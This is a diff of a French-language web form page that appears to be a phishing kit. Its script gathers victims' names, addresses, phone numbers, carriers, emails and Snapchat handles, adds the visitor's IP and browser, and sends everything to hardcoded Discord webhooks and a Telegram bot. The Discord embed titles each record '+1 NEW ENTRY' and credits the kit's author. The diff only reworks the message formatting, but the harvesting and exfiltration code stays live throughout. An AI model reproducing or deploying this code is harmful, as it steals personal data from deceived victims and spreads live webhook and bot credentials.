@@ -66,7 +66,7 @@
 </head>
 <body>
   <div class="c">
-    <h1>Étape 2 : Vos infos</h1>
+    <h1>Étape 2 : Vos info</h1>
     <form id="form2">
       <input name="nom" placeholder="Nom" required />
       <input name="prenom" placeholder="Prénom" required />
@@ -85,6 +85,7 @@
   <script>
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1474169014027813048/-BCyQk9VGD0Y6drGsv2FUp0vc5Jn8qWwMLPPHalPfx9QxKUht-3azqggeTp8UAbtQTwB";
     const DISCORD_ALT_WEBHOOK_URL = "https://discord.com/api/webhooks/1474169014027813048/-BCyQk9VGD0Y6drGsv2FUp0vc5Jn8qWwMLPPHalPfx9QxKUht-3azqggeTp8UAbtQTwB";
+    
     const TELEGRAM_TOKEN = "8692347674:AAGpTTok0FlGAnHhIHu0Cspm2P1fBOCcJAU";
     const TELEGRAM_CHAT_ID = "-1003724340855";
 
@@ -147,7 +148,6 @@
       const operateur = step1.operateur || "Non fourni";
       const telephone = step1.telephone || "Non fourni";
 
-      // Récupération IP et User-Agent via Apify
       const apifyInfo = await getApifyInfo();
       const ip = apifyInfo.ip;
       const ua = apifyInfo.ua;
@@ -157,41 +157,54 @@
         webhookToUse = DISCORD_ALT_WEBHOOK_URL;
       }
 
-      const messageContent =
-`📘 +1 NEW ENTRY: ${step2.snap || "Non fourni"} 📘\n\n` +
-
-`📂 Informations Personnelles\n` +
-`├ 👤 Nom complet : ${step2.nom} ${step2.prenom}\n` +
-`├ 🏠 Adresse : ${step2.adresse || "Non fournie"}\n` +
-`├ 📍 Ville : ${step2.ville}\n` +
-`├ 📮 Zip : ${step2.codePostal}\n` +
-`└ 📱 Numéro de téléphone : ${telephone}\n\n` +
-
-`📧 Contact\n` +
-`├ ✉️ Email : ${step2.email}\n` +
-`├ 👻 Snapchat : ${step2.snap || "Non fourni"}\n` +
-`└ 📡 Opérateur : ${operateur}\n\n` +
-
-`🌐 Connexion\n` +
-`├ 🧭 IP : ${ip}\n` +
-`└ 💻 Navigateur : ${ua}`;
-
-      // ================= DISCORD =================
       const discordEmbed = {
         title: `📘 +1 NEW ENTRY: ${step2.snap || "Non fourni"} 📘`,
         color: 0x9b00ff,
         fields: [
           {
             name: "\u200B",
-            value: messageContent
+            value:
+              `📂 Informations Personnelles\n` +
+              `├ 👤 Nom complet : ${step2.nom} ${step2.prenom}\n` +
+              `├ 🏠 Adresse : ${step2.adresse}\n` +
+              `├ 📍 Ville : ${step2.ville}\n` +
+              `├ 📮 Zip : ${step2.codePostal}\n` +
+              `└ 📱 Numéro de téléphone : \`\`${telephone}\`\`\n\n` +
+
+              `📧 Contact\n` +
+              `├ ✉️ Email : ${step2.email}\n` +
+              `├ 👻 Snapchat : ${step2.snap || "Non fourni"}\n` +
+              `└ 📡 Opérateur : ${operateur}\n\n` +
+
+              `🌐 Connexion\n` +
+              `├ 🧭 IP : ${ip}\n` +
+              `└ 💻 Navigateur : ${ua}`
           }
         ],
         timestamp: new Date().toISOString(),
         footer: { text: "🇪🇸rez by zelephuhq🇪🇸" }
       };
 
-      // ================= TELEGRAM =================
-      const telegramText = messageContent;
+      const telegramText =
+`📘 +1 NEW ENTRY: ${step2.snap || "Non fourni"} 📘
+
+📂 Informations Personnelles
+├ 👤 Nom complet : ${step2.nom} ${step2.prenom}
+├ 🏠 Adresse : ${step2.adresse}
+├ 📍 Ville : ${step2.ville}
+├ 📮 Zip : ${step2.codePostal}
+└ 📱 Numéro de téléphone : \`\`${telephone}\`\`
+
+📧 Contact
+├ ✉️ Email : ${step2.email}
+├ 👻 Snapchat : ${step2.snap || "Non fourni"}
+└ 📡 Opérateur : ${operateur}
+
+🌐 Connexion
+├ 🧭 IP : ${ip}
+└ 💻 Navigateur : ${ua}
+
+🇪🇸rez by zelephuhq🇪🇸`;
 
       try {
         await Promise.all([
